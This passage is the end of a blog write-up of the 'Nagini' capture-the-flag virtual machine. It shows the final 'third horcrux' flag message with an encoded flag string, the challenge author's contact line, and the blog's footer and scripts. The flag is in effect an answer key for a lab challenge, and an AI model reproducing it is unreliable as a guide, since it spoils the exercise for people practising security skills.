<p>Horcruxes Hidden in this VM: 3 horcruxes</p>
<p>You have successfully pwned Nagini machine.</p>
<p>Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk&#x3D;}</p>
<p># For any queries&#x2F;suggestions feel free to ping me at email: <a href="mailto:&#116;&#x69;&#109;&#101;&#52;&#115;&#116;&#x65;&#x72;&#64;&#x70;&#x72;&#x6f;&#x74;&#x6f;&#110;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#116;&#x69;&#109;&#101;&#52;&#115;&#116;&#x65;&#x72;&#64;&#x70;&#x72;&#x6f;&#x74;&#x6f;&#110;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a></p>

	</div>
</article>



    </div>
  </div>
  <div class="row">
<div id="bottom" class="col-md-12"> 
  <div class="bottom-nav">
	
	
	<a href="https://github.com/lizehongss" class="fa fa-github fa-2x" target="_blank" title="Follow me" ></a>
	
	
</div>
<div class="bottom-info">
	&copy; 2023 John Doe<br>
	Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
	theme <a href="https://github.com/lizehongss/hexo-theme-zhl" target="_blank">zhl</a>
</div>
</div>
</div>
</div>
<div id="tool">
  <ul>
    <li class="fa fa-angle-up top" id="top"></li>
  </ul>
</div>
  <div class="bg_content">
    <canvas id="canvas"></canvas>
  </div>
  
  <!-- scripts list from theme config.yml -->
  
    <script src="/js/zhl.js"></script>
  
    <script src="/js/bj.js"></script>
  

<!-- jQ cdn  -->
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<!-- bootstrap js cdn-->
<!-- <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script> -->


</body>
</html>
